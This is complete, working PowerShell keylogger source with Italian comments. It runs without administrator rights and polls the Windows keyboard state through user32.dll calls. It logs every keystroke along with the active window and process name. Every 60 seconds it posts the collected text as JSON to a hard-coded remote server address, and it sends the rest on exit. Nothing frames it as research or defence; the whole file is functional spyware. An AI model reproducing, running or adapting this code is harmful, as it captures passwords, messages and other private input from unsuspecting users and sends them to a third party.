# PowerShell KeyLogger Client
# Versione senza permessi di amministratore

# Configurazione
$UPDATE_INTERVAL = 60  # Invia al server ogni 60 secondi
$SERVER_URL = "http://172.20.22.125:3010/log"  # URL del server
$PC_NAME = $env:COMPUTERNAME

# File di log per debug locale
$LOG_FILE = Join-Path $env:USERPROFILE "Documents\keylogger_debug.log"

# Funzione per scrivere log di debug
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LOG_FILE -Append -Encoding UTF8
}

# Variabili globali
$script:LogBuffer = ""
$script:CurrentWindow = ""
$script:IsRunning = $true

# Definizione delle costanti per le API Windows
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;

public static class Win32 {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    
    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    public static extern bool GetKeyboardState(byte[] lpKeyState);
    
    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    
    [DllImport("user32.dll")]
    public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetKeyboardLayout(uint idThread);
}
"@ -ReferencedAssemblies System.Windows.Forms

# Funzione per ottenere la finestra attiva
function Get-CurrentWindow {
    try {
        $hwnd = [Win32]::GetForegroundWindow()
        $processId = 0
        [Win32]::GetWindowThreadProcessId($hwnd, [ref]$processId) | Out-Null
        
        if ($processId -gt 0) {
            try {
                $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
                if ($process) {
                    $windowTitle = New-Object System.Text.StringBuilder 256
                    [Win32]::GetWindowText($hwnd, $windowTitle, 256) | Out-Null
                    return "$($process.ProcessName) - $($windowTitle.ToString())"
                }
            }
            catch {
                return "Sconosciuto"
            }
        }
        return "Sconosciuto"
    }
    catch {
        return "Sconosciuto"
    }
}

# Funzione per convertire i codici dei tasti
function Convert-KeyCode {
    param([int]$KeyCode)
    
    # Tasti speciali
    switch ($KeyCode) {
        8  { return "[BACKSPACE]" }
        9  { return "[TAB]" }
        13 { return "[ENTER]`n" }
        27 { return "[ESC]" }
        32 { return " " }
        37 { return "[LEFT]" }
        38 { return "[UP]" }
        39 { return "[RIGHT]" }
        40 { return "[DOWN]" }
        46 { return "[DELETE]" }
        default {
            # Prova a convertire il tasto in carattere
            try {
                $keyboardState = New-Object byte[] 256
                [Win32]::GetKeyboardState($keyboardState) | Out-Null
                
                $scanCode = [Win32]::MapVirtualKey($KeyCode, 0)
                $layout = [Win32]::GetKeyboardLayout(0)
                $buffer = New-Object System.Text.StringBuilder 2
                
                $result = [Win32]::ToUnicodeEx($KeyCode, $scanCode, $keyboardState, $buffer, 2, 0, $layout)
                
                if ($result -gt 0) {
                    return $buffer.ToString()
                }
                else {
                    return "[KEY$KeyCode]"
                }
            }
            catch {
                return "[KEY$KeyCode]"
            }
        }
    }
}

# Funzione per inviare i dati al server
function Send-ToServer {
    if (-not [string]::IsNullOrEmpty($script:LogBuffer)) {
        try {
            $payload = @{
                log = $script:LogBuffer
                pc_name = $PC_NAME
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            } | ConvertTo-Json -Depth 2
            
            Write-DebugLog "Tentativo di invio dati: $($script:LogBuffer.Length) caratteri"
            
            $response = Invoke-RestMethod -Uri $SERVER_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 30
            
            Write-DebugLog "Dati inviati con successo"
            $script:LogBuffer = ""  # Pulisci il buffer solo se l'invio è riuscito
        }
        catch {
            Write-DebugLog "Errore durante invio al server: $($_.Exception.Message)"
            # Non pulire il buffer in caso di errore per riprovare al prossimo invio
        }
    }
    else {
        Write-DebugLog "Nessun dato da inviare"
    }
}

# Funzione principale del keylogger
function Start-KeyLogger {
    Write-DebugLog "=== INIZIO SESSIONE $(Get-Date) - PC: $PC_NAME ==="
    $script:LogBuffer += "`n`n=== INIZIO SESSIONE $(Get-Date) - PC: $PC_NAME ===`n`n"
    
    # Array per tenere traccia dello stato dei tasti
    $previousKeyState = @{}
    
    # Inizializza tutti i tasti come non premuti
    for ($i = 8; $i -le 255; $i++) {
        $previousKeyState[$i] = $false
    }
    
    Write-Host "KeyLogger avviato. Premi Ctrl+C per fermare." -ForegroundColor Green
    
    # Timer per l'invio periodico
    $timer = New-Object System.Timers.Timer
    $timer.Interval = $UPDATE_INTERVAL * 1000
    $timer.AutoReset = $true
    $timer.Add_Elapsed({
        Send-ToServer
    })
    $timer.Start()
    
    try {
        while ($script:IsRunning) {
            # Controlla la finestra attiva
            $currentWindow = Get-CurrentWindow
            if ($currentWindow -ne $script:CurrentWindow) {
                $script:CurrentWindow = $currentWindow
                $windowInfo = "`n`n[$(Get-Date)] Finestra: $currentWindow`n"
                $script:LogBuffer += $windowInfo
            }
            
            # Controlla tutti i tasti
            for ($keyCode = 8; $keyCode -le 255; $keyCode++) {
                $currentState = ([Win32]::GetAsyncKeyState($keyCode) -band 0x8000) -ne 0
                
                # Se il tasto è stato appena premuto (transizione da false a true)
                if ($currentState -and -not $previousKeyState[$keyCode]) {
                    $keyChar = Convert-KeyCode -KeyCode $keyCode
                    $script:LogBuffer += $keyChar
                }
                
                $previousKeyState[$keyCode] = $currentState
            }
            
            # Breve pausa per non sovraccaricare la CPU
            Start-Sleep -Milliseconds 10
        }
    }
    catch {
        Write-DebugLog "Errore nel loop principale: $($_.Exception.Message)"
    }
    finally {
        $timer.Stop()
        $timer.Dispose()
        Send-ToServer  # Invia gli ultimi dati prima di chiudere
        Write-DebugLog "KeyLogger terminato"
    }
}

# Gestione dell'interruzione con Ctrl+C
$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    $script:IsRunning = $false
    Send-ToServer
}

# Avvio del keylogger
try {
    Write-DebugLog "=== AVVIO APPLICAZIONE ==="
    Start-KeyLogger
}
catch {
    Write-DebugLog "Errore critico all'avvio: $($_.Exception.Message)"
    Write-Host "Errore critico: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    Write-Host "KeyLogger terminato." -ForegroundColor Yellow
}